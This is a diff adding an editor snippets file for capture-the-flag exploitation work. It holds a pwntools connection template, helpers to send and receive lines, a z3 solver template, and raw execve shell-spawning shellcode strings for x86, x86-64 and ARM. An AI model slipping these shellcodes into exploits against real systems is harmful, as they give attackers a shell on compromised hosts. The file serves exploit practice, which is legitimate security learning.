@@ -1,0 +1,31 @@
+snippet pwn
+	#!/usr/bin/env python
+	# -*- coding: utf-8 -*-
+	from pwn import *   # pip install pwntools
+	
+	r = remote("localhost", 4000)
+	
+	r.interactive()
+snippet sc32
+	"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+snippet sc64
+	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+snippet scarm
+	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+snippet r
+	r.recvuntil("${1}")
+snippet s
+	r.sendline(${1})
+snippet inter
+	r.interactive()
+snippet z3
+	x = [BitVec("x%d" % i, 32) for i in range(32)]
+	
+	s = Solver()
+	s.add()
+	
+	if s.check() != sat:
+	    print "Unsat QQ"
+	else:
+	    ans = s.model()
+	    print "".join([chr(ans[m[i]].as_long()) for i in range(32)])
